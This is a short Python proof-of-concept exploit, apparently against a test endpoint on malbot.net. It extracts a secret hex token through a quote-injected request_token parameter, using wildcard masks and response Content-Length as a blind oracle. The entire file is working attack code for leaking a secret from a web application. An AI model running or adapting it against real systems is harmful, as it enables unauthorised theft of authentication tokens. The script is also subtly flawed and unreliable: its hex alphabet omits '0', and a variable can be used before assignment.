# Copyright ©: Miguel Oleo Blanco 

import requests
import time

URL = "http://malbot.net/poc/?request_token=%27"
MASK = "..........."
HEX = ['1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']

TOKEN = ""
count = 0;
check = True

time_start = time.time()

while (check):
    responB = int(requests.get(URL+MASK+MASK).headers.get('Content-Length'))
    
    for iter in HEX:
        count+=1
        build1 = TOKEN+iter+MASK+MASK
        build2 = TOKEN+MASK+iter+MASK

        req1 = int(requests.get(URL+build1).headers.get('Content-Length'))
        #print("TRY "+build1+" Length Response = "+str(req1))

        req2 = int(requests.get(URL+build2).headers.get('Content-Length'))
        #print("TRY "+build2+" Length Response = "+str(req2))

        if (int(req1) <= responB) and (int(req2) > int(req1)):
            temp = iter
            break
        if(iter == 'f'):
            check = False

    if(check):
        TOKEN = TOKEN + temp
        #print(TOKEN)
print("Iterations = "+str(count))
print("Time elapsed = "+str(time.time()-time_start)+" seconds.")
print("Token: " +TOKEN)